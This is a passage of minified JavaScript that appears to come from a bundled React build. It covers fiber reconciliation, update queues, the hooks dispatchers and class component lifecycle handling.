                for (var T = C = null, j = c, E = c = 0, F = null, z = h.next(); null !== j && !z.done; E++, z = h.next()) {
                    j.index > E ? (F = j, j = null) : F = j.sibling;
                    var Z = p(f, j, z.value, k);
                    if (null === Z) {
                        null === j && (j = F);
                        break;
                    }
                    e && j && null === Z.alternate && t(f, j), c = l(Z, c, E), null === T ? C = Z : T.sibling = Z, T = Z, j = F;
                }
                if (z.done) return n(f, j), B && Wt(f, E), C;
                if (null === j) {
                    for (; !z.done; E++, z = h.next()) null !== (z = m(f, z.value, k)) && (c = l(z, c, E), null === T ? C = z : T.sibling = z, T = z);
                    return B && Wt(f, E), C;
                }
                for (j = r(f, j); !z.done; E++, z = h.next()) null !== (z = g(j, f, E, z.value, k)) && (e && null !== z.alternate && j.delete(null === z.key ? E : z.key), c = l(z, c, E), null === T ? C = z : T.sibling = z, T = z);
                return e && j.forEach(function (A) {
                    return t(f, A);
                }), B && Wt(f, E), C;
            }(f, c, h, k);
            wo(f, h);
        }
        return "string" == typeof h && "" !== h || "number" == typeof h ? (h = "" + h, null !== c && 6 === c.tag ? (n(f, c.sibling), (c = o(c, h)).return = f, f = c) : (n(f, c), (c = xi(h, f.mode, k)).return = f, f = c), i(f)) : n(f, c);
    };
}
var Ln = Sd(!0),
    kd = Sd(!1),
    ul = Ft(null),
    al = null,
    _n = null,
    nu = null;
function ru() {
    nu = _n = al = null;
}
function ou(e) {
    var t = ul.current;
    W(ul), e._currentValue = t;
}
function rs(e, t, n) {
    for (; null !== e;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, null !== r && (r.childLanes |= t)) : null !== r && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return;
    }
}
function In(e, t) {
    al = e, nu = _n = null, null !== (e = e.dependencies) && null !== e.firstContext && (e.lanes & t && (ge = !0), e.firstContext = null);
}
function Le(e) {
    var t = e._currentValue;
    if (nu !== e) if (e = {
        context: e,
        memoizedValue: t,
        next: null
    }, null === _n) {
        if (null === al) throw Error(_(308));
        _n = e, al.dependencies = {
            lanes: 0,
            firstContext: e
        };
    } else _n = _n.next = e;
    return t;
}
var Gt = null;
function lu(e) {
    null === Gt ? Gt = [e] : Gt.push(e);
}
function _d(e, t, n, r) {
    var o = t.interleaved;
    return null === o ? (n.next = n, lu(t)) : (n.next = o.next, o.next = n), t.interleaved = n, ft(e, r);
}
function ft(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (null !== n && (n.lanes |= t), n = e, e = e.return; null !== e;) e.childLanes |= t, null !== (n = e.alternate) && (n.childLanes |= t), n = e, e = e.return;
    return 3 === n.tag ? n.stateNode : null;
}
var St = !1;
function iu(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    };
}
function Cd(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    });
}
function ut(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    };
}
function zt(e, t, n) {
    var r = e.updateQueue;
    if (null === r) return null;
    if (r = r.shared, 2 & L) {
        var o = r.pending;
        return null === o ? t.next = t : (t.next = o.next, o.next = t), r.pending = t, ft(e, n);
    }
    return null === (o = r.interleaved) ? (t.next = t, lu(r)) : (t.next = o.next, o.next = t), r.interleaved = t, ft(e, n);
}
function Fo(e, t, n) {
    if (null !== (t = t.updateQueue) && (t = t.shared, 4194240 & n)) {
        var r = t.lanes;
        n |= r &= e.pendingLanes, t.lanes = n, Hs(e, n);
    }
}
function xa(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (null !== r && n === (r = r.updateQueue)) {
        var o = null,
            l = null;
        if (null !== (n = n.firstBaseUpdate)) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                null === l ? o = l = i : l = l.next = i, n = n.next;
            } while (null !== n);
            null === l ? o = l = t : l = l.next = t;
        } else o = l = t;
        return n = {
            baseState: r.baseState,
            firstBaseUpdate: o,
            lastBaseUpdate: l,
            shared: r.shared,
            effects: r.effects
        }, void (e.updateQueue = n);
    }
    null === (e = n.lastBaseUpdate) ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t;
}
function cl(e, t, n, r) {
    var o = e.updateQueue;
    St = !1;
    var l = o.firstBaseUpdate,
        i = o.lastBaseUpdate,
        s = o.shared.pending;
    if (null !== s) {
        o.shared.pending = null;
        var a = s,
            u = a.next;
        a.next = null, null === i ? l = u : i.next = u, i = a;
        var d = e.alternate;
        null !== d && (s = (d = d.updateQueue).lastBaseUpdate) !== i && (null === s ? d.firstBaseUpdate = u : s.next = u, d.lastBaseUpdate = a);
    }
    if (null !== l) {
        var m = o.baseState;
        for (i = 0, d = u = a = null, s = l; ;) {
            var p = s.lane,
                g = s.eventTime;
            if ((r & p) === p) {
                null !== d && (d = d.next = {
                    eventTime: g,
                    lane: 0,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                });
                e: {
                    var w = e,
                        y = s;
                    switch (p = t, g = n, y.tag) {
                        case 1:
                            if ("function" == typeof (w = y.payload)) {
                                m = w.call(g, m, p);
                                break e;
                            }
                            m = w;
                            break e;
                        case 3:
                            w.flags = -65537 & w.flags | 128;
                        case 0:
                            if (null == (p = "function" == typeof (w = y.payload) ? w.call(g, m, p) : w)) break e;
                            m = Q({}, m, p);
                            break e;
                        case 2:
                            St = !0;
                    }
                }
                null !== s.callback && 0 !== s.lane && (e.flags |= 64, null === (p = o.effects) ? o.effects = [s] : p.push(s));
            } else g = {
                eventTime: g,
                lane: p,
                tag: s.tag,
                payload: s.payload,
                callback: s.callback,
                next: null
            }, null === d ? (u = d = g, a = m) : d = d.next = g, i |= p;
            if (null === (s = s.next)) {
                if (null === (s = o.shared.pending)) break;
                s = (p = s).next, p.next = null, o.lastBaseUpdate = p, o.shared.pending = null;
            }
        }
        if (null === d && (a = m), o.baseState = a, o.firstBaseUpdate = u, o.lastBaseUpdate = d, null !== (t = o.shared.interleaved)) {
            o = t;
            do {
                i |= o.lane, o = o.next;
            } while (o !== t);
        } else null === l && (o.shared.lanes = 0);
        tn |= i, e.lanes = i, e.memoizedState = m;
    }
}
function Sa(e, t, n) {
    if (e = t.effects, t.effects = null, null !== e) for (t = 0; t < e.length; t++) {
        var r = e[t],
            o = r.callback;
        if (null !== o) {
            if (r.callback = null, r = n, "function" != typeof o) throw Error(_(191, o));
            o.call(r);
        }
    }
}
var Qr = {},
    et = Ft(Qr),
    Or = Ft(Qr),
    Mr = Ft(Qr);
function Qt(e) {
    if (e === Qr) throw Error(_(174));
    return e;
}
function su(e, t) {
    switch (U(Mr, t), U(Or, e), U(et, Qr), e = t.nodeType) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : $i(null, "");
            break;
        default:
            t = $i(t = (e = 8 === e ? t.parentNode : t).namespaceURI || null, e = e.tagName);
    }
    W(et), U(et, t);
}
function An() {
    W(et), W(Or), W(Mr);
}
function Ed(e) {
    Qt(Mr.current);
    var t = Qt(et.current),
        n = $i(t, e.type);
    t !== n && (U(Or, e), U(et, n));
}
function uu(e) {
    Or.current === e && (W(et), W(Or));
}
var K = Ft(0);
function dl(e) {
    for (var t = e; null !== t;) {
        if (13 === t.tag) {
            var n = t.memoizedState;
            if (null !== n && (null === (n = n.dehydrated) || "$?" === n.data || "$!" === n.data)) return t;
        } else if (19 === t.tag && void 0 !== t.memoizedProps.revealOrder) {
            if (128 & t.flags) return t;
        } else if (null !== t.child) {
            t.child.return = t, t = t.child;
            continue;
        }
        if (t === e) break;
        for (; null === t.sibling;) {
            if (null === t.return || t.return === e) return null;
            t = t.return;
        }
        t.sibling.return = t.return, t = t.sibling;
    }
    return null;
}
var mi = [];
function au() {
    for (var e = 0; e < mi.length; e++) mi[e]._workInProgressVersionPrimary = null;
    mi.length = 0;
}
var Do = ht.ReactCurrentDispatcher,
    hi = ht.ReactCurrentBatchConfig,
    en = 0,
    G = null,
    q = null,
    te = null,
    fl = !1,
    yr = !1,
    Lr = 0,
    Nh = 0;
function se() {
    throw Error(_(321));
}
function cu(e, t) {
    if (null === t) return !1;
    for (var n = 0; n < t.length && n < e.length; n++) if (!Be(e[n], t[n])) return !1;
    return !0;
}
function du(e, t, n, r, o, l) {
    if (en = l, G = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, Do.current = null === e || null === e.memoizedState ? Ih : zh, e = n(r, o), yr) {
        l = 0;
        do {
            if (yr = !1, Lr = 0, 25 <= l) throw Error(_(301));
            l += 1, te = q = null, t.updateQueue = null, Do.current = Rh, e = n(r, o);
        } while (yr);
    }
    if (Do.current = pl, t = null !== q && null !== q.next, en = 0, te = q = G = null, fl = !1, t) throw Error(_(300));
    return e;
}
function fu() {
    var e = 0 !== Lr;
    return Lr = 0, e;
}
function Xe() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return null === te ? G.memoizedState = te = e : te = te.next = e, te;
}
function Ae() {
    if (null === q) {
        var e = G.alternate;
        e = null !== e ? e.memoizedState : null;
    } else e = q.next;
    var t = null === te ? G.memoizedState : te.next;
    if (null !== t) te = t, q = e; else {
        if (null === e) throw Error(_(310));
        e = {
            memoizedState: (q = e).memoizedState,
            baseState: q.baseState,
            baseQueue: q.baseQueue,
            queue: q.queue,
            next: null
        }, null === te ? G.memoizedState = te = e : te = te.next = e;
    }
    return te;
}
function Ar(e, t) {
    return "function" == typeof t ? t(e) : t;
}
function vi(e) {
    var t = Ae(),
        n = t.queue;
    if (null === n) throw Error(_(311));
    n.lastRenderedReducer = e;
    var r = q,
        o = r.baseQueue,
        l = n.pending;
    if (null !== l) {
        if (null !== o) {
            var i = o.next;
            o.next = l.next, l.next = i;
        }
        r.baseQueue = o = l, n.pending = null;
    }
    if (null !== o) {
        l = o.next, r = r.baseState;
        var s = i = null,
            a = null,
            u = l;
        do {
            var d = u.lane;
            if ((en & d) === d) null !== a && (a = a.next = {
                lane: 0,
                action: u.action,
                hasEagerState: u.hasEagerState,
                eagerState: u.eagerState,
                next: null
            }), r = u.hasEagerState ? u.eagerState : e(r, u.action); else {
                var m = {
                    lane: d,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null
                };
                null === a ? (s = a = m, i = r) : a = a.next = m, G.lanes |= d, tn |= d;
            }
            u = u.next;
        } while (null !== u && u !== l);
        null === a ? i = r : a.next = s, Be(r, t.memoizedState) || (ge = !0), t.memoizedState = r, t.baseState = i, t.baseQueue = a, n.lastRenderedState = r;
    }
    if (null !== (e = n.interleaved)) {
        o = e;
        do {
            l = o.lane, G.lanes |= l, tn |= l, o = o.next;
        } while (o !== e);
    } else null === o && (n.lanes = 0);
    return [t.memoizedState, n.dispatch];
}
function gi(e) {
    var t = Ae(),
        n = t.queue;
    if (null === n) throw Error(_(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        o = n.pending,
        l = t.memoizedState;
    if (null !== o) {
        n.pending = null;
        var i = o = o.next;
        do {
            l = e(l, i.action), i = i.next;
        } while (i !== o);
        Be(l, t.memoizedState) || (ge = !0), t.memoizedState = l, null === t.baseQueue && (t.baseState = l), n.lastRenderedState = l;
    }
    return [l, r];
}
function Nd() { }
function Pd(e, t) {
    var n = G,
        r = Ae(),
        o = t(),
        l = !Be(r.memoizedState, o);
    if (l && (r.memoizedState = o, ge = !0), r = r.queue, pu(Id.bind(null, n, r, e), [e]), r.getSnapshot !== t || l || null !== te && 1 & te.memoizedState.tag) {
        if (n.flags |= 2048, $r(9, Td.bind(null, n, r, o, t), void 0, null), null === ne) throw Error(_(349));
        30 & en || jd(n, t, o);
    }
    return o;
}
function jd(e, t, n) {
    e.flags |= 16384, e = {
        getSnapshot: t,
        value: n
    }, null === (t = G.updateQueue) ? (t = {
        lastEffect: null,
        stores: null
    }, G.updateQueue = t, t.stores = [e]) : null === (n = t.stores) ? t.stores = [e] : n.push(e);
}
function Td(e, t, n, r) {
    t.value = n, t.getSnapshot = r, zd(t) && Rd(e);
}
function Id(e, t, n) {
    return n(function () {
        zd(t) && Rd(e);
    });
}
function zd(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Be(e, n);
    } catch {
        return !0;
    }
}
function Rd(e) {
    var t = ft(e, 1);
    null !== t && We(t, e, 1, -1);
}
function ka(e) {
    var t = Xe();
    return "function" == typeof e && (e = e()), t.memoizedState = t.baseState = e, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Ar,
        lastRenderedState: e
    }, t.queue = e, e = e.dispatch = Th.bind(null, G, e), [t.memoizedState, e];
}
function $r(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    }, null === (t = G.updateQueue) ? (t = {
        lastEffect: null,
        stores: null
    }, G.updateQueue = t, t.lastEffect = e.next = e) : null === (n = t.lastEffect) ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e), e;
}
function Od() {
    return Ae().memoizedState;
}
function Uo(e, t, n, r) {
    var o = Xe();
    G.flags |= e, o.memoizedState = $r(1 | t, n, void 0, void 0 === r ? null : r);
}
function Rl(e, t, n, r) {
    var o = Ae();
    r = void 0 === r ? null : r;
    var l = void 0;
    if (null !== q) {
        var i = q.memoizedState;
        if (l = i.destroy, null !== r && cu(r, i.deps)) return void (o.memoizedState = $r(t, n, l, r));
    }
    G.flags |= e, o.memoizedState = $r(1 | t, n, l, r);
}
function _a(e, t) {
    return Uo(8390656, 8, e, t);
}
function pu(e, t) {
    return Rl(2048, 8, e, t);
}
function Md(e, t) {
    return Rl(4, 2, e, t);
}
function Ld(e, t) {
    return Rl(4, 4, e, t);
}
function Ad(e, t) {
    return "function" == typeof t ? (e = e(), t(e), function () {
        t(null);
    }) : null != t ? (e = e(), t.current = e, function () {
        t.current = null;
    }) : void 0;
}
function $d(e, t, n) {
    return n = null != n ? n.concat([e]) : null, Rl(4, 4, Ad.bind(null, t, e), n);
}
function mu() { }
function Fd(e, t) {
    var n = Ae();
    t = void 0 === t ? null : t;
    var r = n.memoizedState;
    return null !== r && null !== t && cu(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e);
}
function Dd(e, t) {
    var n = Ae();
    t = void 0 === t ? null : t;
    var r = n.memoizedState;
    return null !== r && null !== t && cu(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e);
}
function Ud(e, t, n) {
    return 21 & en ? (Be(n, t) || (n = Hc(), G.lanes |= n, tn |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, ge = !0), e.memoizedState = n);
}
function Ph(e, t) {
    var n = $;
    $ = 0 !== n && 4 > n ? n : 4, e(!0);
    var r = hi.transition;
    hi.transition = {};
    try {
        e(!1), t();
    } finally {
        $ = n, hi.transition = r;
    }
}
function bd() {
    return Ae().memoizedState;
}
function jh(e, t, n) {
    var r = Ot(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    }, Vd(e)) Wd(t, n); else if (null !== (n = _d(e, t, n, r))) {
        We(n, e, r, pe()), Bd(n, t, r);
    }
}
function Th(e, t, n) {
    var r = Ot(e),
        o = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
    if (Vd(e)) Wd(t, o); else {
        var l = e.alternate;
        if (0 === e.lanes && (null === l || 0 === l.lanes) && null !== (l = t.lastRenderedReducer)) try {
            var i = t.lastRenderedState,
                s = l(i, n);
            if (o.hasEagerState = !0, o.eagerState = s, Be(s, i)) {
                var a = t.interleaved;
                return null === a ? (o.next = o, lu(t)) : (o.next = a.next, a.next = o), void (t.interleaved = o);
            }
        } catch { }
        null !== (n = _d(e, t, o, r)) && (We(n, e, r, o = pe()), Bd(n, t, r));
    }
}
function Vd(e) {
    var t = e.alternate;
    return e === G || null !== t && t === G;
}
function Wd(e, t) {
    yr = fl = !0;
    var n = e.pending;
    null === n ? t.next = t : (t.next = n.next, n.next = t), e.pending = t;
}
function Bd(e, t, n) {
    if (4194240 & n) {
        var r = t.lanes;
        n |= r &= e.pendingLanes, t.lanes = n, Hs(e, n);
    }
}
var pl = {
    readContext: Le,
    useCallback: se,
    useContext: se,
    useEffect: se,
    useImperativeHandle: se,
    useInsertionEffect: se,
    useLayoutEffect: se,
    useMemo: se,
    useReducer: se,
    useRef: se,
    useState: se,
    useDebugValue: se,
    useDeferredValue: se,
    useTransition: se,
    useMutableSource: se,
    useSyncExternalStore: se,
    useId: se,
    unstable_isNewReconciler: !1
},
    Ih = {
        readContext: Le,
        useCallback: function (e, t) {
            return Xe().memoizedState = [e, void 0 === t ? null : t], e;
        },
        useContext: Le,
        useEffect: _a,
        useImperativeHandle: function (e, t, n) {
            return n = null != n ? n.concat([e]) : null, Uo(4194308, 4, Ad.bind(null, t, e), n);
        },
        useLayoutEffect: function (e, t) {
            return Uo(4194308, 4, e, t);
        },
        useInsertionEffect: function (e, t) {
            return Uo(4, 2, e, t);
        },
        useMemo: function (e, t) {
            var n = Xe();
            return t = void 0 === t ? null : t, e = e(), n.memoizedState = [e, t], e;
        },
        useReducer: function (e, t, n) {
            var r = Xe();
            return t = void 0 !== n ? n(t) : t, r.memoizedState = r.baseState = t, e = {
                pending: null,
                interleaved: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: e,
                lastRenderedState: t
            }, r.queue = e, e = e.dispatch = jh.bind(null, G, e), [r.memoizedState, e];
        },
        useRef: function (e) {
            return e = {
                current: e
            }, Xe().memoizedState = e;
        },
        useState: ka,
        useDebugValue: mu,
        useDeferredValue: function (e) {
            return Xe().memoizedState = e;
        },
        useTransition: function () {
            var e = ka(!1),
                t = e[0];
            return e = Ph.bind(null, e[1]), Xe().memoizedState = e, [t, e];
        },
        useMutableSource: function () { },
        useSyncExternalStore: function (e, t, n) {
            var r = G,
                o = Xe();
            if (B) {
                if (void 0 === n) throw Error(_(407));
                n = n();
            } else {
                if (n = t(), null === ne) throw Error(_(349));
                30 & en || jd(r, t, n);
            }
            o.memoizedState = n;
            var l = {
                value: n,
                getSnapshot: t
            };
            return o.queue = l, _a(Id.bind(null, r, l, e), [e]), r.flags |= 2048, $r(9, Td.bind(null, r, l, n, t), void 0, null), n;
        },
        useId: function () {
            var e = Xe(),
                t = ne.identifierPrefix;
            if (B) {
                var n = st;
                t = ":" + t + "R" + (n = (it & ~(1 << 32 - Ve(it) - 1)).toString(32) + n), 0 < (n = Lr++) && (t += "H" + n.toString(32)), t += ":";
            } else t = ":" + t + "r" + (n = Nh++).toString(32) + ":";
            return e.memoizedState = t;
        },
        unstable_isNewReconciler: !1
    },
    zh = {
        readContext: Le,
        useCallback: Fd,
        useContext: Le,
        useEffect: pu,
        useImperativeHandle: $d,
        useInsertionEffect: Md,
        useLayoutEffect: Ld,
        useMemo: Dd,
        useReducer: vi,
        useRef: Od,
        useState: function () {
            return vi(Ar);
        },
        useDebugValue: mu,
        useDeferredValue: function (e) {
            return Ud(Ae(), q.memoizedState, e);
        },
        useTransition: function () {
            return [vi(Ar)[0], Ae().memoizedState];
        },
        useMutableSource: Nd,
        useSyncExternalStore: Pd,
        useId: bd,
        unstable_isNewReconciler: !1
    },
    Rh = {
        readContext: Le,
        useCallback: Fd,
        useContext: Le,
        useEffect: pu,
        useImperativeHandle: $d,
        useInsertionEffect: Md,
        useLayoutEffect: Ld,
        useMemo: Dd,
        useReducer: gi,
        useRef: Od,
        useState: function () {
            return gi(Ar);
        },
        useDebugValue: mu,
        useDeferredValue: function (e) {
            var t = Ae();
            return null === q ? t.memoizedState = e : Ud(t, q.memoizedState, e);
        },
        useTransition: function () {
            return [gi(Ar)[0], Ae().memoizedState];
        },
        useMutableSource: Nd,
        useSyncExternalStore: Pd,
        useId: bd,
        unstable_isNewReconciler: !1
    };
function Fe(e, t) {
    if (e && e.defaultProps) {
        for (var n in t = Q({}, t), e = e.defaultProps) void 0 === t[n] && (t[n] = e[n]);
        return t;
    }
    return t;
}
function os(e, t, n, r) {
    n = null == (n = n(r, t = e.memoizedState)) ? t : Q({}, t, n), e.memoizedState = n, 0 === e.lanes && (e.updateQueue.baseState = n);
}
var Ol = {
    isMounted: function (e) {
        return !!(e = e._reactInternals) && sn(e) === e;
    },
    enqueueSetState: function (e, t, n) {
        e = e._reactInternals;
        var r = pe(),
            o = Ot(e),
            l = ut(r, o);
        l.payload = t, null != n && (l.callback = n), null !== (t = zt(e, l, o)) && (We(t, e, o, r), Fo(t, e, o));
    },
    enqueueReplaceState: function (e, t, n) {
        e = e._reactInternals;
        var r = pe(),
            o = Ot(e),
            l = ut(r, o);
        l.tag = 1, l.payload = t, null != n && (l.callback = n), null !== (t = zt(e, l, o)) && (We(t, e, o, r), Fo(t, e, o));
    },
    enqueueForceUpdate: function (e, t) {
        e = e._reactInternals;
        var n = pe(),
            r = Ot(e),
            o = ut(n, r);
        o.tag = 2, null != t && (o.callback = t), null !== (t = zt(e, o, r)) && (We(t, e, r, n), Fo(t, e, r));
    }
};
function Ca(e, t, n, r, o, l, i) {
    return "function" == typeof (e = e.stateNode).shouldComponentUpdate ? e.shouldComponentUpdate(r, l, i) : !t.prototype || !t.prototype.isPureReactComponent || !Tr(n, r) || !Tr(o, l);
}
function Hd(e, t, n) {
    var r = !1,
        o = At,
        l = t.contextType;
    return "object" == typeof l && null !== l ? l = Le(l) : (o = we(t) ? Zt : ce.current, l = (r = null != (r = t.contextTypes)) ? On(e, o) : At), t = new t(n, l), e.memoizedState = null !== t.state && void 0 !== t.state ? t.state : null, t.updater = Ol, e.stateNode = t, t._reactInternals = e, r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = o, e.__reactInternalMemoizedMaskedChildContext = l), t;
}
function Ea(e, t, n, r) {
    e = t.state, "function" == typeof t.componentWillReceiveProps && t.componentWillReceiveProps(n, r), "function" == typeof t.UNSAFE_componentWillReceiveProps && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && Ol.enqueueReplaceState(t, t.state, null);
}
function ls(e, t, n, r) {
    var o = e.stateNode;
    o.props = n, o.state = e.memoizedState, o.refs = {}, iu(e);
    var l = t.contextType;
    "object" == typeof l && null !== l ? o.context = Le(l) : (l = we(t) ? Zt : ce.current, o.context = On(e, l)), o.state = e.memoizedState, "function" == typeof (l = t.getDerivedStateFromProps) && (os(e, t, l, n), o.state = e.memoizedState), "function" == typeof t.getDerivedStateFromProps || "function" == typeof o.getSnapshotBeforeUpdate || "function" != typeof o.UNSAFE_componentWillMount && "function" != typeof o.componentWillMount || (t = o.state, "function" == typeof o.componentWillMount && o.componentWillMount(), "function" == typeof o.UNSAFE_componentWillMount && o.UNSAFE_componentWillMount(), t !== o.state && Ol.enqueueReplaceState(o, o.state, null), cl(e, n, o, r), o.state = e.memoizedState), "function" == typeof o.componentDidMount && (e.flags |= 4194308);
}
function $n(e, t) {
    try {
        var n = "",
            r = t;
        do {
            n += im(r), r = r.return;
        } while (r);
        var o = n;
    } catch (l) {
        o = "\nError generating stack: " + l.message + "\n" + l.stack;
    }
    return {
        value: e,
        source: t,
        stack: o,
        digest: null
    };
}
function yi(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n !== null && n !== void 0 ? n : null,
        digest: t !== null && t !== void 0 ? t : null
    };
}
function is(e, t) {
    try {
        console.error(t.value);
    } catch (n) {
        setTimeout(function () {
            throw n;
        });
    }
}
var Oh = "function" == typeof WeakMap ? WeakMap : Map;
function Kd(e, t, n) {
    (n = ut(-1, n)).tag = 3, n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function () {
        hl || (hl = !0, vs = r), is(e, t);
    }, n;
}
function Gd(e, t, n) {
    (n = ut(-1, n)).tag = 3;
    var r = e.type.getDerivedStateFromError;
    if ("function" == typeof r) {
        var o = t.value;
        n.payload = function () {
            return r(o);
        }, n.callback = function () {
            is(e, t);
        };
    }
    var l = e.stateNode;
    return null !== l && "function" == typeof l.componentDidCatch && (n.callback = function () {
        is(e, t), "function" != typeof r && (null === Rt ? Rt = new Set([this]) : Rt.add(this));
        var i = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: null !== i ? i : ""
        });
    }), n;
}
function Na(e, t, n) {
    var r = e.pingCache;
    if (null === r) {
        r = e.pingCache = new Oh();
        var o = new Set();
        r.set(t, o);
    } else void 0 === (o = r.get(t)) && (o = new Set(), r.set(t, o));
    o.has(n) || (o.add(n), e = Gh.bind(null, e, t, n), t.then(e, e));
}
function Pa(e) {
    do {
        var t;
        if ((t = 13 === e.tag) && (t = null === (t = e.memoizedState) || null !== t.dehydrated), t) return e;
        e = e.return;
    } while (null !== e);
    return null;
}
function ja(e, t, n, r, o) {
    return 1 & e.mode ? (e.flags |= 65536, e.lanes = o, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, 1 === n.tag && (null === n.alternate ? n.tag = 17 : ((t = ut(-1, 1)).tag = 2, zt(n, t, 1))), n.lanes |= 1), e);
}
var Mh = ht.ReactCurrentOwner,
    ge = !1;
function fe(e, t, n, r) {
    t.child = null === e ? kd(t, null, n, r) : Ln(t, e.child, n, r);
}
function Ta(e, t, n, r, o) {
    n = n.render;
    var l = t.ref;
    return In(t, o), r = du(e, t, n, r, l, o), n = fu(), null === e || ge ? (B && n && qs(t), t.flags |= 1, fe(e, t, r, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, pt(e, t, o));
}
function Ia(e, t, n, r, o) {
    if (null === e) {
        var l = n.type;
        return "function" != typeof l || ku(l) || void 0 !== l.defaultProps || null !== n.compare || void 0 !== n.defaultProps ? ((e = Bo(n.type, null, r, t, t.mode, o)).ref = t.ref, e.return = t, t.child = e) : (t.tag = 15, t.type = l, Qd(e, t, l, r, o));
    }
    if (l = e.child, !(e.lanes & o)) {
        var i = l.memoizedProps;
        if ((n = null !== (n = n.compare) ? n : Tr)(i, r) && e.ref === t.ref) return pt(e, t, o);
    }
    return t.flags |= 1, (e = Mt(l, r)).ref = t.ref, e.return = t, t.child = e;
}
function Qd(e, t, n, r, o) {
    if (null !== e) {
        var l = e.memoizedProps;
        if (Tr(l, r) && e.ref === t.ref) {
            if (ge = !1, t.pendingProps = r = l, !(e.lanes & o)) return t.lanes = e.lanes, pt(e, t, o);
            131072 & e.flags && (ge = !0);
        }
    }
    return ss(e, t, n, r, o);
}
function Yd(e, t, n) {
    var r = t.pendingProps,
        o = r.children,
        l = null !== e ? e.memoizedState : null;
    if ("hidden" === r.mode) {
        if (1 & t.mode) {
            if (!(1073741824 & n)) return e = null !== l ? l.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
                baseLanes: e,
                cachePool: null,
                transitions: null
            }, t.updateQueue = null, U(En, ke), ke |= e, null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            }, r = null !== l ? l.baseLanes : n, U(En, ke), ke |= r;
        } else t.memoizedState = {
            baseLanes: 0,
            cachePool: null,
            transitions: null
        }, U(En, ke), ke |= n;
    } else null !== l ? (r = l.baseLanes | n, t.memoizedState = null) : r = n, U(En, ke), ke |= r;
    return fe(e, t, o, n), t.child;
}
function Xd(e, t) {
    var n = t.ref;
    (null === e && null !== n || null !== e && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152);
}
function ss(e, t, n, r, o) {
    var l = we(n) ? Zt : ce.current;
    return l = On(t, l), In(t, o), n = du(e, t, n, r, l, o), r = fu(), null === e || ge ? (B && r && qs(t), t.flags |= 1, fe(e, t, n, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, pt(e, t, o));
}
function za(e, t, n, r, o) {
    if (we(n)) {
        var l = !0;
        ll(t);
    } else l = !1;
    if (In(t, o), null === t.stateNode) bo(e, t), Hd(t, n, r), ls(t, n, r, o), r = !0; else if (null === e) {
        var i = t.stateNode,
            s = t.memoizedProps;
        i.props = s;
        var a = i.context,
            u = n.contextType;
        "object" == typeof u && null !== u ? u = Le(u) : u = On(t, u = we(n) ? Zt : ce.current);
        var d = n.getDerivedStateFromProps,
            m = "function" == typeof d || "function" == typeof i.getSnapshotBeforeUpdate;
        m || "function" != typeof i.UNSAFE_componentWillReceiveProps && "function" != typeof i.componentWillReceiveProps || (s !== r || a !== u) && Ea(t, i, r, u), St = !1;
        var p = t.memoizedState;
        i.state = p, cl(t, r, i, o), a = t.memoizedState, s !== r || p !== a || ye.current || St ? ("function" == typeof d && (os(t, n, d, r), a = t.memoizedState), (s = St || Ca(t, n, s, r, p, a, u)) ? (m || "function" != typeof i.UNSAFE_componentWillMount && "function" != typeof i.componentWillMount || ("function" == typeof i.componentWillMount && i.componentWillMount(), "function" == typeof i.UNSAFE_componentWillMount && i.UNSAFE_componentWillMount()), "function" == typeof i.componentDidMount && (t.flags |= 4194308)) : ("function" == typeof i.componentDidMount && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = a), i.props = r, i.state = a, i.context = u, r = s) : ("function" == typeof i.componentDidMount && (t.flags |= 4194308), r = !1);
    } else {
